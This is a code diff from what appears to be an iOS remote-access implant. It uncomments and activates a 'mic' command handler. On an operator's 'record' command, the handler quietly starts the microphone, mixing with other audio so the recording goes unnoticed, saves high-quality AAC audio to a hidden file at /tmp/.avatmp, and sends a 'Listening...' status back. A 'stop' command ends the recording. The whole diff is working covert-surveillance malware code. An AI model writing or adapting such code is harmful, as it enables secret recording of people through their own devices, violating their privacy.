@@ -399,51 +399,43 @@ bool sysTaskRunning = false;
     [self term];
 }
 
-// - (void)mic:(NSString*)arg {
-//   if ([arg isEqualToString:@"record"]) {
-//     NSError* initMicError = nil;
-//     [self initmic:initMicError];
-//     if (initMicError) {
-//       [self sendString:initMicError.localizedDescription];
-//     } else {
-//       NSString* file = @"/tmp/.avatmp";
-//       [self.fileManager removeItemAtPath:file error:NULL];
-//       [[AVAudioSession sharedInstance]
-//           setCategory:AVAudioSessionCategoryRecord
-//           withOptions:AVAudioSessionCategoryOptionMixWithOthers
-//                 error:nil];
-
-//       NSString* destinationString = file;
-//       NSURL* destinationURL = [NSURL fileURLWithPath:destinationString];
-//       NSDictionary* mysettings = @{
-//         AVFormatIDKey : @(kAudioFormatMPEG4AAC),
-//         AVEncoderAudioQualityKey : @(AVAudioQualityHigh),
-//         AVNumberOfChannelsKey : @1,
-//         AVSampleRateKey : @22050.0f
-//       };
-//       [[AVAudioSession sharedInstance] setActive:YES error:nil];
-//       self.audioRecorder = [[AVAudioRecorder alloc]
-//       initWithURL:destinationURL
-//                                                        settings:mysettings
-//                                                           error:nil];
-//       self.audioRecorder.meteringEnabled = true;
-//       self.audioRecorder.delegate = self;
-
-//       [self.audioRecorder prepareToRecord];
-//       [self.audioRecorder record];
-//       [self sendString:@"Listening..."];
-//     }
-//   } else if ([arg isEqualToString:@"stop"]) {
-//     if ([self.audioRecorder isRecording]) {
-//       [self.audioRecorder stop];
-//       // send confirmation
-//       [self sendString:@"{\"status\":1}"];
-//     } else {
-//       [self sendString:@"{\"error\":\"Not currently recording\"}"];
-//     }
-//   }
-//   [self term];
-// }
+- (void)mic:(NSString*)arg {
+    if ([arg isEqualToString:@"record"]) {
+        NSError* initMicError = nil;
+        [self initmic:initMicError];
+        if (initMicError) {
+            [self sendString:initMicError.localizedDescription];
+        } else {
+            NSString* file = @"/tmp/.avatmp";
+            [self.fileManager removeItemAtPath:file error:NULL];
+            [[AVAudioSession sharedInstance] setCategory:AVAudioSessionCategoryRecord withOptions:AVAudioSessionCategoryOptionMixWithOthers error:nil];
+            NSString* destinationString = file;
+            NSURL* destinationURL = [NSURL fileURLWithPath:destinationString];
+            NSDictionary* mysettings = @{
+                AVFormatIDKey : @(kAudioFormatMPEG4AAC),
+                AVEncoderAudioQualityKey : @(AVAudioQualityHigh),
+                AVNumberOfChannelsKey : @1,
+                AVSampleRateKey : @22050.0f
+            };
+            
+            [[AVAudioSession sharedInstance] setActive:YES error:nil];
+            self.audioRecorder = [[AVAudioRecorder alloc] initWithURL:destinationURL settings:mysettings error:nil];
+            self.audioRecorder.meteringEnabled = true;
+            self.audioRecorder.delegate = self;
+            [self.audioRecorder prepareToRecord];
+            [self.audioRecorder record];
+            [self sendString:@"Listening..."];
+        }
+    } else if ([arg isEqualToString:@"stop"]) {
+        if ([self.audioRecorder isRecording]) {
+            [self.audioRecorder stop];        
+            [self sendString:@"{\"status\":1}"];
+        } else {
+            [self sendString:@"{\"error\":\"Not currently recording\"}"];
+        }
+    }
+    [self term];
+}
 
 - (void)initmic:(NSError*)error {
     NSURL* soundFile;
